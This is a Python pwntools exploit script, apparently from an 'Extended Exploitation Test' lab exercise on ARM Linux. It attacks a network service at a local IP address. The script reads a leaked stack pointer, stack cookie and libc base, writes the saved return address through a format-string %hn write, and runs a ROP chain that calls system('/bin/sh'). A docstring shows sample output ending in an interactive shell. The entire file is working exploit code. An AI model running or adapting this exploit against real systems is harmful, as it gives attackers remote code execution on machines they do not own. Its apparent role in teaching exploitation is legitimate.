#!/usr/bin/env python

"""
************************************
* Extended Exploitation Test (EET) *
************************************
(c) Jos Wetzels, Wouter Bokslag

root@debian:~/ut/eet# python fms_exploit.py
[+] Opening connection to 192.168.0.102 on port 1341: Done
[+] Got stackpointer: [bef54af0]
[+] Got stack cookie: [258a3900]
[+] Got libc base: [b6d9a000]
[*] Building ROP chain...
[*] Building FMS exploit string...
[*] Sending exploit payload...
[*] Switching to interactive mode
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi)
"""

import sys
import re
from pwn import *
from struct import pack
from gadgets import arm_gadgets

def do_exploit(h, libc_version, libc_base, stack_cookie, stack_pointer):
	print "[*] Building ROP chain..."

	# Binary base
	bin_base = 0

	# Padding
	padding = "B" * 51

	# Offsets from binary and libc base to ROP chain elements
	seed48_offset = arm_gadgets['libc'][libc_version]['seed48']
	system_offset = arm_gadgets['libc'][libc_version]['system']
	binsh_offset = arm_gadgets['libc'][libc_version]['binsh']
	pivot_offset = 0x000107e0 	# sp = (sp + 0x1238); pop {pc}

	# Determine ROP Chain element addresses
	PIVOT_gadget = bin_base + pivot_offset 			# pivot gadget
	ARG_gadget1 = libc_base + seed48_offset + 20    # <seed48+20>
	SYSTEM_addr = libc_base + system_offset         # <system+0>
	BINSH_addr = libc_base + binsh_offset       	# @"/bin/sh\x00"
	junk = 0x0BADC0DE

	rop_chain = "".join([pack('<I', x) for x in [ARG_gadget1 + 4, BINSH_addr - 6, ARG_gadget1, junk, SYSTEM_addr]])

	print "[*] Building FMS exploit string..."

	val1 = ((PIVOT_gadget & 0xffff) - 4) # 16 lower bits of address only
	target_addr = (stack_pointer + 0x1204) # write to 16 lower bits of saved return address
	databuffer = pack('<I', target_addr) + chr(0x25) + str(val1) + "x" + chr(0x25) + "3$hn" + padding + rop_chain

	print "[*] Sending exploit payload..."

	h.send(databuffer)

	h.interactive()
	return

def grab_infoleak(msg):
	stack_pointer, stack_cookie = [long(x, 16) for x in re.findall('\[(.*?)\.(.*?)\]', msg.split("\n")[0], re.I)[0]]
	libc_base = long(re.findall('libc.so.6\]\@\[(.*?)\]', msg, re.M|re.I)[0], 16)

	return stack_pointer, stack_cookie, libc_base

host = '192.168.0.102'
port = 1341
libc_version = '2.19'

h = remote(host, port, timeout = None)

msg = h.recvuntil('> ')
stack_pointer, stack_cookie, libc_base = grab_infoleak(msg)

print "[+] Got stackpointer: [%x]" % stack_pointer
print "[+] Got stack cookie: [%x]" % stack_cookie
print "[+] Got libc base: [%x]" % libc_base

do_exploit(h, libc_version, libc_base, stack_cookie, stack_pointer)